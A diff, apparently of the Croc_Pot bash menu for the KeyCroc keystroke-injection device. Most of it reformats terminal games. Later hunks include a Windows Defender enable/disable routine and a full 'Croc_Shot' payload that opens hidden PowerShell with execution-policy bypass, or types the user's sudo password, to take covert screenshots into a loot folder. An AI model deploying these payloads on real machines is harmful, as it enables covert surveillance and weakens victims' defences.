+# test if piece can be moved to new location
+	local j i x y x_test=$1 y_test=$2
+	for ((j = 0, i = 1; j < 8; j += 2, i = j + 1)) {
+		((y = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + y_test)) # new y coordinate of piece cell
+		((x = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + x_test)) # new x coordinate of piece cell
+		((y < 0 || y >= PLAYFIELD_H || x < 0 || x >= PLAYFIELD_W )) && return 1         # check if we are out of the play field
+		((${play_field[y * PLAYFIELD_W + x]} != -1 )) && return 1                       # check if location is already ocupied
 }
-
+	return 0
+}
 get_random_next() {
-    # next piece becomes current
-    current_piece=$next_piece
-    current_piece_rotation=$next_piece_rotation
-    current_piece_color=$next_piece_color
-    # place current at the top of play field, approximately at the center
-    ((current_piece_x = (PLAYFIELD_W - 4) / 2))
-    ((current_piece_y = 0))
-    # check if piece can be placed at this location, if not - game over
-    new_piece_location_ok $current_piece_x $current_piece_y || cmd_quit
-    show_current
-
-    clear_next
-    # now let's get next piece
-    ((next_piece = RANDOM % ${#piece[@]}))
-    ((next_piece_rotation = RANDOM % (${#piece[$next_piece]} / 8)))
-    ((next_piece_color = RANDOM % ${#colors[@]}))
-    show_next
+# next piece becomes current
+	current_piece=$next_piece
+	current_piece_rotation=$next_piece_rotation
+	current_piece_color=$next_piece_color
+# place current at the top of play field, approximately at the center
+	((current_piece_x = (PLAYFIELD_W - 4) / 2))
+	((current_piece_y = 0))
+# check if piece can be placed at this location, if not - game over
+	new_piece_location_ok $current_piece_x $current_piece_y || cmd_quit
+	show_current
+	clear_next
+# now let's get next piece
+	((next_piece = RANDOM % ${#piece[@]}))
+	((next_piece_rotation = RANDOM % (${#piece[$next_piece]} / 8)))
+	((next_piece_color = RANDOM % ${#colors[@]}))
+	show_next
 }
-
 draw_border() {
-    local i x1 x2 y
-
-    set_bold
-    set_fg $BORDER_COLOR
-    ((x1 = PLAYFIELD_X - 2))               # 2 here is because border is 2 characters thick
-    ((x2 = PLAYFIELD_X + PLAYFIELD_W * 2)) # 2 here is because each cell on play field is 2 characters wide
-    for ((i = 0; i < PLAYFIELD_H + 1; i++)) {
-        ((y = i + PLAYFIELD_Y))
-        xyprint $x1 $y "<|"
-        xyprint $x2 $y "|>"
-    }
-
-    ((y = PLAYFIELD_Y + PLAYFIELD_H))
-    for ((i = 0; i < PLAYFIELD_W; i++)) {
-        ((x1 = i * 2 + PLAYFIELD_X)) # 2 here is because each cell on play field is 2 characters wide
-        xyprint $x1 $y '=='
-        xyprint $x1 $((y + 1)) "\/"
-    }
-    reset_colors
+	local i x1 x2 y
+	set_bold
+	set_fg $BORDER_COLOR
+	((x1 = PLAYFIELD_X - 2))               # 2 here is because border is 2 characters thick
+	((x2 = PLAYFIELD_X + PLAYFIELD_W * 2)) # 2 here is because each cell on play field is 2 characters wide
+	for ((i = 0; i < PLAYFIELD_H + 1; i++)) {
+		((y = i + PLAYFIELD_Y))
+		xyprint $x1 $y "<|"
+		xyprint $x2 $y "|>"
 }
-
+	((y = PLAYFIELD_Y + PLAYFIELD_H))
+	for ((i = 0; i < PLAYFIELD_W; i++)) {
+		((x1 = i * 2 + PLAYFIELD_X)) # 2 here is because each cell on play field is 2 characters wide
+		xyprint $x1 $y '=='
+		xyprint $x1 $((y + 1)) "\/"
+}
+	reset_colors
+}
 toggle_color() {
-    $no_color && no_color=false || no_color=true
-    show_next
-    update_score 0
-    toggle_help
-    toggle_help
-    draw_border
-    redraw_playfield
-    show_current
+	$no_color && no_color=false || no_color=true
+	show_next
+	update_score 0
+	toggle_help
+	toggle_help
+	draw_border
+	redraw_playfield
+	show_current
 }
-
 init() {
-    local i x1 x2 y
-    # playfield is initialized with -1s (empty cells)
-    for ((i = 0; i < PLAYFIELD_H * PLAYFIELD_W; i++)) {
-        play_field[$i]=-1
-    }
-
-    clear
-    hide_cursor
-    get_random_next
-    get_random_next
-    toggle_color
+	local i x1 x2 y
+# playfield is initialized with -1s (empty cells)
+	for ((i = 0; i < PLAYFIELD_H * PLAYFIELD_W; i++)) {
+	play_field[$i]=-1
 }
-
+	clear
+	hide_cursor
+	get_random_next
+	get_random_next
+	toggle_color
+}
 # this function runs in separate process
 # it sends DOWN commands to controller with appropriate delay
 ticker() {
-    # on SIGUSR2 this process should exit
-    trap exit SIGUSR2
-    # on SIGUSR1 delay should be decreased, this happens during level ups
-    trap 'DELAY=$(awk "BEGIN {print $DELAY * $DELAY_FACTOR}")' SIGUSR1
-    while true ; do echo -n $DOWN; sleep $DELAY; done
+# on SIGUSR2 this process should exit
+	trap exit SIGUSR2
+# on SIGUSR1 delay should be decreased, this happens during level ups
+	trap 'DELAY=$(awk "BEGIN {print $DELAY * $DELAY_FACTOR}")' SIGUSR1
+	while true ; do echo -n $DOWN; sleep $DELAY; done
 }
-
 # this function processes keyboard input
 reader() {
-    trap exit SIGUSR2 # this process exits on SIGUSR2
-    trap '' SIGUSR1   # SIGUSR1 is ignored
-    local -u key a='' b='' cmd esc_ch=$'\x1b'
-    # commands is associative array, which maps pressed keys to commands, sent to controller
-    declare -A commands=([A]=$ROTATE [C]=$RIGHT [D]=$LEFT
-        [_S]=$ROTATE [_A]=$LEFT [_D]=$RIGHT
-        [_]=$DROP [_Q]=$QUIT [_H]=$TOGGLE_HELP [_N]=$TOGGLE_NEXT [_C]=$TOGGLE_COLOR)
-    while read -s -n 1 key ; do
-        case "$a$b$key" in
-            "${esc_ch}["[ACD]) cmd=${commands[$key]} ;; # cursor key
-            *${esc_ch}${esc_ch}) cmd=$QUIT ;;           # exit on 2 escapes
-            *) cmd=${commands[_$key]:-} ;;              # regular key. If space was pressed $key is empty
-        esac
-        a=$b   # preserve previous keys
-        b=$key
-        [ -n "$cmd" ] && echo -n "$cmd"
-    done
+	trap exit SIGUSR2 # this process exits on SIGUSR2
+	trap '' SIGUSR1   # SIGUSR1 is ignored
+	local -u key a='' b='' cmd esc_ch=$'\x1b'
+# commands is associative array, which maps pressed keys to commands, sent to controller
+	declare -A commands=([A]=$ROTATE [C]=$RIGHT [D]=$LEFT
+		[_S]=$ROTATE [_A]=$LEFT [_D]=$RIGHT
+		[_]=$DROP [_Q]=$QUIT [_H]=$TOGGLE_HELP [_N]=$TOGGLE_NEXT [_C]=$TOGGLE_COLOR)
+	while read -s -n 1 key ; do
+		case "$a$b$key" in
+			"${esc_ch}["[ACD]) cmd=${commands[$key]} ;; # cursor key
+			*${esc_ch}${esc_ch}) cmd=$QUIT ;;           # exit on 2 escapes
+			*) cmd=${commands[_$key]:-} ;;              # regular key. If space was pressed $key is empty
+		esac
+		a=$b   # preserve previous keys
+		b=$key
+		[ -n "$cmd" ] && echo -n "$cmd"
+	done
 }
-
 # this function updates occupied cells in play_field array after piece is dropped
 flatten_playfield() {
-    local i j k x y
-    for ((i = 0, j = 1; i < 8; i += 2, j += 2)) {
-        ((y = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + current_piece_y))
-        ((x = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + current_piece_x))
-        ((k = y * PLAYFIELD_W + x))
-        play_field[$k]=$current_piece_color
-    }
+	local i j k x y
+	for ((i = 0, j = 1; i < 8; i += 2, j += 2)) {
+		((y = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + current_piece_y))
+		((x = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + current_piece_x))
+		((k = y * PLAYFIELD_W + x))
+		play_field[$k]=$current_piece_color
 }
-
+}
 # this function goes through play_field array and eliminates lines without empty sells
 process_complete_lines() {
-    local j i complete_lines
-    ((complete_lines = 0))
-    for ((j = 0; j < PLAYFIELD_W * PLAYFIELD_H; j += PLAYFIELD_W)) {
-        for ((i = j + PLAYFIELD_W - 1; i >= j; i--)) {
-            ((${play_field[$i]} == -1)) && break # empty cell found
-        }
-        ((i >= j)) && continue # previous loop was interrupted because empty cell was found
-        ((complete_lines++))
-        # move lines down
-        for ((i = j - 1; i >= 0; i--)) {
-            play_field[$((i + PLAYFIELD_W))]=${play_field[$i]}
-        }
-        # mark cells as free
-        for ((i = 0; i < PLAYFIELD_W; i++)) {
-            play_field[$i]=-1
-        }
-    }
-    return $complete_lines
+	local j i complete_lines
+	((complete_lines = 0))
+	for ((j = 0; j < PLAYFIELD_W * PLAYFIELD_H; j += PLAYFIELD_W)) {
+	for ((i = j + PLAYFIELD_W - 1; i >= j; i--)) {
+		((${play_field[$i]} == -1)) && break # empty cell found
 }
-
+		((i >= j)) && continue # previous loop was interrupted because empty cell was found
+		((complete_lines++))
+# move lines down
+		for ((i = j - 1; i >= 0; i--)) {
+		play_field[$((i + PLAYFIELD_W))]=${play_field[$i]}
+}
+# mark cells as free
+		for ((i = 0; i < PLAYFIELD_W; i++)) {
+		play_field[$i]=-1
+ }
+}
+	return $complete_lines
+}
 process_fallen_piece() {
-    flatten_playfield
-    process_complete_lines && return
-    update_score $?
-    redraw_playfield
+	flatten_playfield
+	process_complete_lines && return
+	update_score $?
+	redraw_playfield
 }
-
 move_piece() {
 # arguments: 1 - new x coordinate, 2 - new y coordinate
 # moves the piece to the new location if possible
-    if new_piece_location_ok $1 $2 ; then # if new location is ok
-        clear_current                     # let's wipe out piece current location
-        current_piece_x=$1                # update x ...
-        current_piece_y=$2                # ... and y of new location
-        show_current                      # and draw piece in new location
-        return 0                          # nothing more to do here
-    fi                                    # if we could not move piece to new location
-    (($2 == current_piece_y)) && return 0 # and this was not horizontal move
-    process_fallen_piece                  # let's finalize this piece
-    get_random_next                       # and start the new one
-    return 1
+	if new_piece_location_ok $1 $2 ; then # if new location is ok
+		clear_current                     # let's wipe out piece current location
+		current_piece_x=$1                # update x ...
+		current_piece_y=$2                # ... and y of new location
+		show_current                      # and draw piece in new location
+		return 0                          # nothing more to do here
+	fi                                    # if we could not move piece to new location
+	(($2 == current_piece_y)) && return 0 # and this was not horizontal move
+	process_fallen_piece                  # let's finalize this piece
+	get_random_next                       # and start the new one
+	return 1
 }
-
 cmd_right() {
-    move_piece $((current_piece_x + 1)) $current_piece_y
+	move_piece $((current_piece_x + 1)) $current_piece_y
 }
-
 cmd_left() {
-    move_piece $((current_piece_x - 1)) $current_piece_y
+	move_piece $((current_piece_x - 1)) $current_piece_y
 }
-
 cmd_rotate() {
-    local available_rotations old_rotation new_rotation
-    available_rotations=$((${#piece[$current_piece]} / 8))            # number of orientations for this piece
-    old_rotation=$current_piece_rotation                              # preserve current orientation
-    new_rotation=$(((old_rotation + 1) % available_rotations))        # calculate new orientation
-    current_piece_rotation=$new_rotation                              # set orientation to new
-    if new_piece_location_ok $current_piece_x $current_piece_y ; then # check if new orientation is ok
-        current_piece_rotation=$old_rotation                          # if yes - restore old orientation
-        clear_current                                                 # clear piece image
-        current_piece_rotation=$new_rotation                          # set new orientation
-        show_current                                                  # draw piece with new orientation
-    else                                                              # if new orientation is not ok
-        current_piece_rotation=$old_rotation                          # restore old orientation
-    fi
+	local available_rotations old_rotation new_rotation
+	available_rotations=$((${#piece[$current_piece]} / 8))            # number of orientations for this piece
+	old_rotation=$current_piece_rotation                              # preserve current orientation
+	new_rotation=$(((old_rotation + 1) % available_rotations))        # calculate new orientation
+	current_piece_rotation=$new_rotation                              # set orientation to new
+	if new_piece_location_ok $current_piece_x $current_piece_y ; then # check if new orientation is ok
+	current_piece_rotation=$old_rotation                          # if yes - restore old orientation
+	clear_current                                                 # clear piece image
+	current_piece_rotation=$new_rotation                          # set new orientation
+	show_current                                                  # draw piece with new orientation
+	else                                                              # if new orientation is not ok
+		current_piece_rotation=$old_rotation                          # restore old orientation
+	fi
 }
-
 cmd_down() {
-    move_piece $current_piece_x $((current_piece_y + 1))
+	move_piece $current_piece_x $((current_piece_y + 1))
 }
-
 cmd_drop() {
-    # move piece all way down
-    # this is example of do..while loop in bash
-    # loop body is empty
-    # loop condition is done at least once
-    # loop runs until loop condition would return non zero exit code
-    while move_piece $current_piece_x $((current_piece_y + 1)) ; do : ; done
+# move piece all way down
+# this is example of do..while loop in bash
+# loop body is empty
+# loop condition is done at least once
+# loop runs until loop condition would return non zero exit code
+	while move_piece $current_piece_x $((current_piece_y + 1)) ; do : ; done
 }
-
 cmd_quit() {
-    showtime=false                               # let's stop controller ...
-    pkill -SIGUSR2 -f "/bin/bash $0" # ... send SIGUSR2 to all script instances to stop forked processes ...
-    xyprint $GAMEOVER_X $GAMEOVER_Y "Game over!"
-    echo -e "$screen_buffer"                     # ... and print final message
+	showtime=false                               # let's stop controller ...
+	pkill -SIGUSR2 -f "/bin/bash $0" # ... send SIGUSR2 to all script instances to stop forked processes ...
+	xyprint $GAMEOVER_X $GAMEOVER_Y "Game over!"
+	echo -e "$screen_buffer"                     # ... and print final message
 }
-
 controller() {
-    # SIGUSR1 and SIGUSR2 are ignored
-    trap '' SIGUSR1 SIGUSR2
-    local cmd commands
-
-    # initialization of commands array with appropriate functions
-    commands[$QUIT]=cmd_quit
-    commands[$RIGHT]=cmd_right
-    commands[$LEFT]=cmd_left
-    commands[$ROTATE]=cmd_rotate
-    commands[$DOWN]=cmd_down
-    commands[$DROP]=cmd_drop
-    commands[$TOGGLE_HELP]=toggle_help
-    commands[$TOGGLE_NEXT]=toggle_next
-    commands[$TOGGLE_COLOR]=toggle_color
-    init
-    while $showtime; do           # run while showtime variable is true, it is changed to false in cmd_quit function
-        echo -ne "$screen_buffer" # output screen buffer ...
-        screen_buffer=""          # ... and reset it
-        read -s -n 1 cmd          # read next command from stdout
-        ${commands[$cmd]}         # run command
-    done
+# SIGUSR1 and SIGUSR2 are ignored
+	trap '' SIGUSR1 SIGUSR2
+	local cmd commands
+# initialization of commands array with appropriate functions
+	commands[$QUIT]=cmd_quit
+	commands[$RIGHT]=cmd_right
+	commands[$LEFT]=cmd_left
+	commands[$ROTATE]=cmd_rotate
+	commands[$DOWN]=cmd_down
+	commands[$DROP]=cmd_drop
+	commands[$TOGGLE_HELP]=toggle_help
+	commands[$TOGGLE_NEXT]=toggle_next
+	commands[$TOGGLE_COLOR]=toggle_color
+	init
+	while $showtime; do           # run while showtime variable is true, it is changed to false in cmd_quit function
+	echo -ne "$screen_buffer" # output screen buffer ...
+	screen_buffer=""          # ... and reset it
+	read -s -n 1 cmd          # read next command from stdout
+	${commands[$cmd]}         # run command
+	done
 }
-
 stty_g=`stty -g` # let's save terminal state
-
 # output of ticker and reader is joined and piped into controller
 (
-    ticker & # ticker runs as separate process
-    reader
+	ticker & # ticker runs as separate process
+	reader
 )|(
-    controller
+	controller
 )
-
 show_cursor
 stty $stty_g # let's restore terminal state
 }
-
 ##
 #   - Pass time Snake
 ##
-
 snake_game() {
 ##############################################################################
 #                                                                            #
@@ -3424,22 +3206,18 @@ printf "\e]0;HOUSENKA\007"
 stty -echo -icanon
 USER=$(whoami)
 NAME=$(grep $USER /etc/passwd | cut -d : -f 5)
-
 #############
 # ANSI data #
 #############
-
 GAME_OVER[0]="\e[1;35m╥┌  ╓─╖ ╥ ╥ ╥─┐ ╥─┐    ╥ ╥ ╥┐  ╥ ┬\e[0m"
 GAME_OVER[1]="\e[0;31m╟┴┐ ║ ║ ║\║ ╟┤  ║      ╟─╢ ╟┴┐ ╨╥┘\e[0m"
 GAME_OVER[2]="\e[1;31m╨ ┴ ╙─╜ ╨ ╨ ╨─┘ ╨─┘    ╨ ╨ ╨ ┴  ╨ \e[0m"
 GAME_OVER[3]="\e[0;32m╥────────────────────────────────╥\e[0m"
 GAME_OVER[4]="\e[1;32m║  Stiskni ENTER pro novou hru!  ║\e[0m"
 GAME_OVER[5]="\e[1;36m╨────────────────────────────────╨\e[0m"
-
 #############
 # FUNCTIONS #
 #############
-
 function at_exit() {
 	printf "\e[?9l"          # Turn off mouse reading
 	printf "\e[?12l\e[?25h"  # Turn on cursor
@@ -3447,12 +3225,10 @@ function at_exit() {
 	tput sgr0
 	clear
 }
-
 function get_first() {
 # Return: first index of array
-    eval echo \${!$1[@]} | cut -d ' ' -f 1
+	eval echo \${!$1[@]} | cut -d ' ' -f 1
 }
-
 function gen_food() {
 	local x y food
 	for ((i=0; i<$[2*$FOOD_NUMBER]; i++))
@@ -3460,23 +3236,21 @@ function gen_food() {
 		x=$[RANDOM % (MW-2) + 2]
 		y=$[RANDOM % (MH-2) + 2]
 		# check if leaf position is unique
-		if [ $(echo ${!FOOD[@]} | tr ' ' '\n' | grep -c "^$y;$x$") -gt 0 ]
-		then
-			: $[i--]
-			continue
-		fi
-		food=$[i & 1] # 0 -- poison, 1 -- leaf
-		FOOD["$y;$x"]=$food
-		if [ $food -eq 1 ] ; then 
-			printf "\e[$y;${x}f\e[1;32m♠\e[0m";
-		else
-			printf "\e[$y;${x}f\e[1;31m♣\e[0m";
-		fi
+	if [ $(echo ${!FOOD[@]} | tr ' ' '\n' | grep -c "^$y;$x$") -gt 0 ]
+	then
+		: $[i--]
+	continue
+	fi
+	food=$[i & 1] # 0 -- poison, 1 -- leaf
+	FOOD["$y;$x"]=$food
+	if [ $food -eq 1 ] ; then 
+		printf "\e[$y;${x}f\e[1;32m♠\e[0m";
+	else
+		printf "\e[$y;${x}f\e[1;31m♣\e[0m";
+	fi
 	done
 }
-
 function check_food() {
-
 	local first
 	# check what was eaten in garden
 	if [ "${FOOD["$HY;$HX"]}" == "1" ] ; then
@@ -3500,12 +3274,11 @@ function check_food() {
 		local last
 		last=${#HOUSENKA[@]}
 		if [ $(echo ${HOUSENKA[@]} | tr ' ' '\n' | \
-			   head -n $[last-2] | grep -c "^$HY;$HX$") -gt 0 ] ; then
-			DEATH=3
+		head -n $[last-2] | grep -c "^$HY;$HX$") -gt 0 ] ; then
+		DEATH=3
 		fi
 	fi
 }
-
 function game_over() {
 	trap : ALRM # disable interupt
 	printf "\a"
@@ -3518,7 +3291,6 @@ function game_over() {
 	DEATH=0 SCORE=0 DEFAULT_FOOD_NUMBER=2
 	new_level
 }
-
 function centered_window() {
 # $1 width $2 height $3 content
 	w=$1 h=$2
@@ -3535,7 +3307,6 @@ function centered_window() {
 	done
 	printf "\e[${bl}f└"; printf '─%.0s' $(eval echo {1..$w}); printf '┘\n'
 }
-
 function move() {
 	check_food
 	if [ $DEATH -gt 0 ] ; then game_over; fi
@@ -3552,7 +3323,6 @@ function move() {
 	: $[C++]
 	game_info
 }
-
 function draw_area() {
 # draw play area
 printf "\e[31m"
@@ -3568,7 +3338,6 @@ do
 	sleep 0.01
 done
 }
-
 function new_level() {
 	unset HOUSENKA
 	for i in ${!FOOD[@]}; do unset FOOD[$i]; done # erase leaves and poison
@@ -3583,7 +3352,6 @@ function new_level() {
 	C=2
 	trap move ALRM
 }
-
 function title_screen() {
 TITLE="QlpoOTFBWSZTWWMw1D8AAnd//X38AIhAA/24Cg2UCD7H13BVRH9ktkYEBAgAEABQ
 BHgAEQBSlBJEQhqaA0ZDQBoA0ABpoBo9Rk0Ghw00wQyGmmRkwgGmgDCaNMmABA0E
@@ -3615,16 +3383,13 @@ o6Y6ZDm+THkzMzIdPXzUOo4RVH/xdyRThQkGMw1D8A=="
 	done
 	read
 }
-
 function game_info() {
 	printf "\e[$[MH+1];0fHráč: $USER (Nejlepší výkon: $TOP_SCORE)"
 	printf "\e[$[MH+1];$[MW-12]fSkóre: %5d" $SCORE
 }
-
 ########
 # MAIN #
 ########
-
 exec 2>/dev/null
 trap at_exit ERR EXIT 
 if [ -f $CONFIG ] ; then
@@ -3641,73 +3406,65 @@ do
 	KEY=${PRESS:2}
 done
 }
-
 ##
 #   - Pass time Matrix effect
 ##
-
 function matrix_effect() {
-	
 N_LINE=$(( $(tput lines) - 1));
 N_COLUMN=$(tput cols);
-
 get_char() {
-    RANDOM_U=$(echo $(( (RANDOM % 9) + 0)));
-    RANDOM_D=$(echo $(( (RANDOM % 9) + 0)));
-    CHAR_TYPE="\u04"
-    printf "%s" "$CHAR_TYPE$RANDOM_D$RANDOM_U";
+	RANDOM_U=$(echo $(( (RANDOM % 9) + 0)));
+	RANDOM_D=$(echo $(( (RANDOM % 9) + 0)));
+	CHAR_TYPE="\u04"
+	printf "%s" "$CHAR_TYPE$RANDOM_D$RANDOM_U";
 }
-
 cursor_position() {
-    echo "\033[$1;${RANDOM_COLUMN}H";
+	echo "\033[$1;${RANDOM_COLUMN}H";
 }
-
 write_char() {
-    CHAR=$(get_char);
-    print_char $1 $2 $CHAR
+	CHAR=$(get_char);
+	print_char $1 $2 $CHAR
 }
-
 erase_char() { 
-    CHAR="\u0020"
-    print_char $1 $2 $CHAR
+	CHAR="\u0020"
+	print_char $1 $2 $CHAR
 }
-
 print_char() {
-    CURSOR=$(cursor_position $1);
-    echo -e "$CURSOR$2$3";
+	CURSOR=$(cursor_position $1);
+	echo -e "$CURSOR$2$3";
 }
-
 draw_line() {
-    RANDOM_COLUMN=$[RANDOM%N_COLUMN];
-    RANDOM_LINE_SIZE=$(echo $(( (RANDOM % $N_LINE) + 1)));
-    SPEED=0.05
-    COLOR="\033[32m";
-    COLOR_HEAD="\033[37m";
-    for i in $(seq 1 $N_LINE ); do 
-        write_char $[i-1] $COLOR;
-        write_char $i $COLOR_HEAD;
-        sleep $SPEED;
-        if [ $i -ge $RANDOM_LINE_SIZE ]; then 
-            erase_char $[i-RANDOM_LINE_SIZE]; 
-        fi;
-    done;
-    for i in $(seq $[i-$RANDOM_LINE_SIZE] $N_LINE); do 
-        erase_char $i
-        sleep $SPEED;
-    done
+	RANDOM_COLUMN=$[RANDOM%N_COLUMN];
+	RANDOM_LINE_SIZE=$(echo $(( (RANDOM % $N_LINE) + 1)));
+	SPEED=0.05
+	COLOR="\033[32m";
+	COLOR_HEAD="\033[37m";
+	for i in $(seq 1 $N_LINE ); do 
+		write_char $[i-1] $COLOR;
+		write_char $i $COLOR_HEAD;
+		sleep $SPEED;
+		if [ $i -ge $RANDOM_LINE_SIZE ]; then 
+		erase_char $[i-RANDOM_LINE_SIZE]; 
+		fi;
+	done;
+	for i in $(seq $[i-$RANDOM_LINE_SIZE] $N_LINE); do 
+		erase_char $i
+		sleep $SPEED;
+	done
 }
-
 matrix() {
-    tput setab 000
-    clear
-    while true; do
-        draw_line &
-        sleep 0.5;
-    done
+	tput setab 000
+	clear
+	while true; do
+		draw_line &
+		sleep 0.5;
+	done
 }
 matrix ;
 }
-
+##
+#   - Pass time Menu
+##
 MenuTitle PASS TIME GAMES
 MenuColor 1 CHESS ; echo -ne "           ${clear}\n"
 MenuColor 2 TETRIS ; echo -ne "          ${clear}\n"
@@ -3726,17 +3483,13 @@ MenuEnd
 	*) invalid_entry ;;
 	esac
 }
-
 ##
-#   - Windows defender Function
+#----Windows defender Function
 ##
-
 windows_defender() {
-
 ##
-#   - Windows defender enable Function
+#----Windows defender enable Function
 ##
-
 defender_enable() {
 	Q GUI i
 	sleep 3
@@ -3759,11 +3512,9 @@ defender_enable() {
 	Q ALT-F4
 	Q ALT-F4
 }
-
 ##
-#   - Windows defender disenable Function
+#----Windows defender disenable Function
 ##
-
 defender_disenable() {
 	Q GUI i
 	sleep 3
@@ -3788,14 +3539,12 @@ defender_disenable() {
 	Q ALT-F4
 	Q ALT-F4
 }
-
 ##
-#   - Windows defender Menu
+#----Windows defender Menu
 ##
-
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "${OS_CHECK}" = WINDOWS ]; then
 MenuTitle WINDOWS DEFENDER
 MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "   ${clear}\n"
 MenuColor 2 DISENABLE WINDOWS DEFENDER ; echo -ne "${clear}\n"
@@ -3813,11 +3562,9 @@ else
 	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This will not work on this OS')${LINE_}-->${clear}${OS_CHECK}\n"
 fi
 }
-
 ##
-#   - Screenshot Croc_Shot function
+#----Screenshot Croc_Shot function
 ##
-
 screen_shot() {
 	echo -ne "$(Info_Screen '
 -Option to install Croc_Shot.txt payload this will take screenshot of pc\n
@@ -3825,24 +3572,23 @@ screen_shot() {
 -This will save to loot/Croc_pot/screenshot\n
 -Option to take screenshot now\n
 -For this to work properly run Croc_Pot_Payload.txt first to get OS detection\n')${clear}\n"
-	if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then
+if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then
 	sleep 1
 else
 	sleep 1
 	mkdir /root/udisk/loot/Croc_pot/screenshot
 fi
-
 ##
-#   - Screen Croc_Shot Payload install
+#----Screen Croc_Shot Payload install
 ##
 	local Croc_Shot=/root/udisk/payloads/Croc_Shot.txt
-	if [ -e "${Croc_Shot}" ]; then
+if [ -e "${Croc_Shot}" ]; then
 	echo -ne "\n${LINE_}\e[40;m$(ColorGreen 'Croc_Shot.txt Payload is installed check payload folder')${clear}${LINE_}\n\n"
 else
 	read -p "$(ColorBlue 'WOULD YOU LIKE TO INSTALL CROC_SHOT PAYLOAD YES OR NO AND PRESS [ENTER]:') " CS
 	case $CS in
 	yY] | [yY][eE][sS])
-	echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc\n#
+		echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc\n#
 MATCH crocshot\n#\nPC_PW=LINUX      #<-----Edit LINUX-PC_PASSWD_HERE\n#\n  if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then\n  LED B\n  sleep 1\nelse\n  LED SETUP\n  mkdir /root/udisk/loot/Croc_pot/screenshot
   sleep 1\nfi\n  ATTACKMODE HID STORAGE\n  CROC_OS=/root/udisk/loot/Croc_OS.txt\n  WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\n  OS_CHECK=\$(sed -n 1p \${CROC_OS})\n    if [ \"\${OS_CHECK}\" = WINDOWS ]; then
       if [ -e \"\${WINDS_SHOT}\" ]; then\n      LED ATTACK\n      Q GUI r\n      sleep 1\n      Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n      Q ENTER\n      sleep 1\n      Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
@@ -3856,17 +3602,15 @@ echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_pot\screenshot\\\\\\\\\\\$(ge
       Q ENTER\n      sleep 1\n      Q STRING \"\${PC_PW}\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n      Q ENTER\n      Q ALT-TAB\n      sleep 10
       ATTACKMODE HID\n      LED FINISH;;\n    *)\n      LED ATTACK\n      Q ALT F2\n      sleep 1\n      Q STRING \"mate-terminal\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
       Q ENTER\n      sleep 1\n      Q STRING \"\${PC_PW}\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n      Q ENTER\n      Q ALT-TAB\n      sleep 10\n      ATTACKMODE HID\n      LED FINISH;;\n esac\nfi" >> ${Croc_Shot} ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\t\t\e[40m${LINE_}$(ColorYellow 'Maybe next time')\e[40m${LINE_}${clear}\n";;
-					  *)
-						invalid_entry ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\t\t\e[40m${LINE_}$(ColorYellow 'Maybe next time')\e[40m${LINE_}${clear}\n";;
+	*)
+		invalid_entry ;;
 	esac
 fi
-
 ##
-#   - Croc_Shot take pic now function
+#----Croc_Shot take pic now function
 ##
-
 read -p "$(ColorBlue 'TAKE SCREENSHOT NOW YES OR NO AND PRESS [ENTER]:') " CSN
 case $CSN in
 	[yY] | [yY][eE][sS])
@@ -3911,84 +3655,82 @@ Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawi
 	Q STRING "exit"
 	Q ENTER
 	ATTACKMODE HID
-	fi
+fi
 else
 	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
 	case $HOST_CHECK in
-		raspberrypi)
-					Q ALT-F4
-					sleep 1
-					Q GUI d
-					Q STRING "terminal"
-					Q ENTER
-					Q ENTER
-					sleep 1
-					Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \${PC_PIC} &>/dev/null & exit"
-					Q ENTER
-					Q ALT-TAB
-					Q ALT-TAB
-					sleep 10
-					ATTACKMODE HID;;
-			 parrot)
-					Q ALT F2
-					sleep 1
-					Q STRING "mate-terminal"
-					Q ENTER
-					sleep 1
-					Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-					Q ENTER
-					sleep 1
-					Q STRING "${PC_PW}"
-					Q ENTER
-					sleep 1
